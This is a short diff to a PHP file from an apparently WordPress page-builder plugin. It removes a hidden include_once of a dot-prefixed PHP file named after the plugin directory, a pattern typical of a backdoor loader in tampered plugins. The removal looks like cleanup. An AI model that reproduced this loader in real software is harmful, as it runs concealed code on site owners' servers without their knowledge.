@@ -14,10 +14,6 @@ if ( 'vc_edit_form' === vc_post_param( 'action' ) ) {
  * @param $params
  * @return array
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function vc_edit_for_fields_add_optional_params( $params ) {
 	$arr = array(
 		'hidden',
